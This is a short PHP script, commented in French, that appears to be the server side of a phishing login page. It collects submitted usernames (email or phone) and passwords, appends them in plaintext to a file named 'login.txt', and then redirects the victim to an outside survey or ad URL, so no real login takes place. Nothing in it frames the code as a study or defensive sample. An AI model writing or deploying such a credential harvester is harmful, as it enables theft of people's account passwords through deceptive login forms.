<?php
// Vérifie si le formulaire a été soumis via la méthode POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupère les données du formulaire
    $username = htmlspecialchars($_POST["username"]);  // Adresse e-mail ou numéro de téléphone
    $password = htmlspecialchars($_POST["password"]);  // Mot de passe

    // Formate les données pour l'enregistrement dans le fichier
    $data = "Nom d'utilisateur (Email/Téléphone) : " . $username . " | Mot de passe : " . $password . "\n";

    // Enregistre les données dans le fichier 'login.txt'
    // Le fichier sera créé s'il n'existe pas déjà, sinon les données seront ajoutées à la fin
    file_put_contents("login.txt", $data, FILE_APPEND);

    // Redirige l'utilisateur vers un autre site web après l'enregistrement
    header("Location: https://choofoogoaltee.com/finance-survey/272?var=21548660&s=880981261281141219&ymid=1147523&z=8304443&var_3=45bf0773b18612693f38f9587bf57bde&rdk=rk3");
    exit();  // Arrête l'exécution du script pour éviter tout autre traitement
} else {
    echo "Aucune donnée reçue.";
}
?>